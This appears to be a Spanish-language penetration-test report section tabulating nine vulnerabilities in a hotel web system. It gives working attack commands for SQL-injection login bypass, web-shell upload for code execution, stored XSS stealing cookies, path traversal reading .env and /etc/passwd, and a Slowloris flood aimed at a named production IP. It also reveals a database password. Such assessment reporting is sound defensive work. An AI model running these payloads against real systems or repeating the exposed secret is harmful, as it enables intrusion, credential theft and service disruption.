## VII. ANÁLISIS DE VULNERABILIDADES

Tras realizar las pruebas de penetración sobre el sistema Hotel PlazaMoyobamba, se detectaron las siguientes vulnerabilidades listadas en la tabla adjunta:

| # | Vulnerabilidad | Severidad | Herramienta | Evidencia | Comando |
|---|---------------|-----------|-------------|-----------|---------|
| 1 | **Inyección SQL (SQLi)** | Crítica | curl, sqlmap | Bypass de login con `admin' OR '1'='1' --`. Extracción de 26 tablas, 10 usuarios (admin/admin@gmail.com). PostgreSQL 16.14. | `curl -d "login=admin'+OR+'1'%3D'1'+--&password=x"` |
| 2 | **Mass Assignment** | Alta | curl, Burp Suite | PATCH /profile con `role_name=admin` → usuario obtiene rol admin. Acceso a `/admin/usuarios` HTTP 200. | `curl -X POST /profile -d "_method=PATCH&role_name=admin"` |
| 3 | **File Upload → RCE** | Crítica | curl | Subida de shell.php sin auth. RCE como www-data: `uid=82(www-data)`. | `curl -F "file=@shell.php" /upload` → `curl /uploads/shell.php?cmd=id` |
| 4 | **DDoS (Slowloris)** | Media | slowhttptest | 300 conexiones lentas abiertas sin bloqueo. Servidor no rechaza conexiones excesivas. | `slowhttptest -c 300 -H -g -i 10 -r 200 -t GET -u "http://37.60.230.11/"` |
| 5 | **XSS Almacenado** | Alta | curl | Bio inyectado con `<script>alert(document.cookie)</script>` se ejecuta al cargar perfil. Vulnerable por `{!! $user->bio !!}`. | `curl -X PATCH /profile -d "bio=<script>alert(document.cookie)</script>"` |
| 6 | **IDOR** | Alta | curl | `/api/sales/121` vs `122` devuelven datos de distintos clientes (client_id: 55 vs 29) sin auth. | `curl /api/sales/{121..240}` |
| 7 | **No Rate Limit** | Media | curl, hydra | 30 requests en 1583ms sin bloqueo ni retardo. | `for i in {1..30}; do curl -X POST /login & done` |
| 8 | **LFI** | Alta | curl | Path traversal: `../.env` expone APP_DEBUG=true, DB_PASSWORD=plaza_pass_123. `/etc/passwd` completo. | `curl /download?file=../../.env` |
| 9 | **Debug Mode** | Media | curl | Error "Array to string conversion" muestra stack trace Laravel 12.58.0, PHP 8.2.32, rutas internas, queries SQL. | `curl /download?file[]=test` |

Todas las vulnerabilidades fueron verificadas exitosamente contra el servidor en producción (37.60.230.11).